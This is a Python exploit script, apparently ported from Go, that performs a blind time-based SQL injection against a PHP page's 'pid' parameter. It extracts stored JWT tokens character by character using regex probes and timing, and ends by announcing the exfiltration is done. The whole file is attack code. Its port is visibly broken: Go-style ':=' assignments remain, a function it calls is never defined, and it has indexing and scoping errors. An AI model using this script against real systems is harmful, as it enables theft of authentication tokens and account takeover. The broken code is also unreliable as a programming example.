#!/usr/bin/env python3
# Ported from Go to Python3 by @DarkMatterMatt
import requests
import time

total_requests = 0
TARGET = "http://localhost:8888/index.php?pid="

def create_tree(arr, start, end):
    if start > end:
        return []
    
    mid = start + (end - start) / 2
    root = arr[mid]
    left = create_tree(arr, start, mid - 1)
    right = create_tree(arr, mid + 1, end)

    return [root, *left, *right]

def check_arr(query, arr, char=None):
    for i, elem in enumerate(arr):
        target = TARGET + query.replace("[check]", elem)
        if char is not None:
            target = target.replace("[iterate]", str(char))

        total_requests += 1

        start = time.time()
        response = requests.get(target)
        elapsed = time.time() - start

        if elapsed > 1:
            return i
        # if len(response.text) > 30:
        #	 return i

    return 0

def get_header(query):
    headers = {
        # I+I|M|U
        "IUzI": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.",
        "IUzM": "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.",
        "IUzU": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.",

        # S+I|M|U
        "SUzI": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.",
        "SUzM": "eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.",
        "SUzU": "eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.",

        # F+I|M|U
        "FUzI": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.",
        "FUzM": "eyJhbGciOiJFUzM4NCIsInR5cCI6IkpXVCIsImtpZCI6ImlUcVhYSTB6YkFuSkNLRGFvYmZoa00xZi02ck1TcFRmeVpNUnBfMnRLSTgifQ.",
        "FUzU": "eyJhbGciOiJFUzUxMiIsInR5cCI6IkpXVCIsImtpZCI6InhaRGZacHJ5NFA5dlpQWnlHMmZOQlJqLTdMejVvbVZkbTd0SG9DZ1NOZlkifQ.",

        # Q+I|M
        "QUzI": "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.",
        "QUzM": "eyJhbGciOiJQUzM4NCIsInR5cCI6IkpXVCJ9.",
    }

    check_algo_array = [
        "\"^.{11}[I]\"",
        "\"^.{11}[S]\"",
        "\"^.{11}[F]\"",
        "\"^.{11}[Q]\"",
    ]
    check_algo_array_inner = [
        "\"^.{14}[I]\"",
        "\"^.{14}[M]\"",
        "\"^.{14}[U]\"",
    ]

    # step 1, check header
    flag = check_arr(query, check_algo_array)
    header = check_arr(query, check_algo_array_inner)

    if flag == 0:
        if header == 0:
            return headers["IUzI"]
        if header == 1:
            return headers["IUzM"]
        if header == 2:
            return headers["IUzU"]
    
    if flag == 1:
        if header == 0:
            return headers["SUzI"]
        if header == 1:
            return headers["SUzM"]
        if header == 2:
            return headers["SUzU"]
    
    if flag == 2:
        if header == 0:
            return headers["FUzI"]
        if header == 1:
            return headers["FUzM"]
        if header == 2:
            return headers["FUzU"]
        
    if flag == 3:
        if header == 0:
            return headers["QUzI"]
        if header == 1:
            return headers["QUzM"]

def main():
	print("[+] Retriving JWT Tokens.....")
	print("[+] ")

	payload = "1/**/AND/**/(select/**/CAST(jwt/**/AS/**/BINARY)/**/rlike/**/[check])"

	char = get_header(payload)

	arr_numbers = list(range(48, 57 + 1))
	arr_lowers = list(range(97, 122 + 1))
	arr_uppers = list(range(65, 90 + 1))

	numbers_tree := create_tree(arr_numbers, 0, len(arr_numbers) - 1)
	lower_tree := create_tree(arr_lowers, 0, len(arr_lowers) - 1)
	upper_tree := create_tree(arr_uppers, 0, len(arr_uppers) - 1)

	arr_case := [
		"\"^.{[iterate]}[a-z]\"",
		"\"^.{[iterate]}[A-Z]\"",
		"\"^.{[iterate]}[0-9]\"",
		"\"^.{[iterate]}[-]\"",
		"\"^.{[iterate]}[_]\"",
		"\"^.{[iterate]}[.]\"",
    ]

	print(char)

	for i in range(len(char), 155):
		k = check_arr(payload, arr_case, i)
        
		if k == 0:
			print(get_arr(payload, lower_tree, i), end="")
		elif k == 1:
			print(get_arr(payload, upper_tree, i), end="")
		elif k == 2:
			print(get_arr(payload, numbers_tree, i), end="")
		elif k == 3:
			print("-", end="")
		elif k == 4:
			print("_", end="")
		elif k == 5:
			print(".", end="")

	print("\n[+] Number of Requests:", total_requests)
	print("[+] Exfiltration Done!")

if __name__ == "__main__":
    main()
